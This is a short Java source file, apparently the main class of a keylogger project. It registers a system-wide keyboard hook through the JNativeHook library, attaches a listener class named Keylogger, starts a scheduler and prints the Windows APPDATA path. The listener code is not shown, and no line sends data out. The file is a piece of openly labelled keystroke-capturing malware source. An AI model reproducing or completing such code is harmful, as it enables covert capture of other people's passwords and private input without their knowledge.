package me.pasteiton.kl;

import me.pasteiton.kl.features.Keylogger;
import me.pasteiton.kl.utils.Scheduler;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;



public class Main {
	public static void main(String[] args) {
    	try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
			System.exit(1);
		}
    	GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    	
    	Scheduler s = new Scheduler();
    	//s.runOnMain();
    	
    	System.out.println(System.getenv("APPDATA"));
    	
    	//FileManager fm = new FileManager();
    	//fm.printContents("Hello World");
    	
    	
	}
}
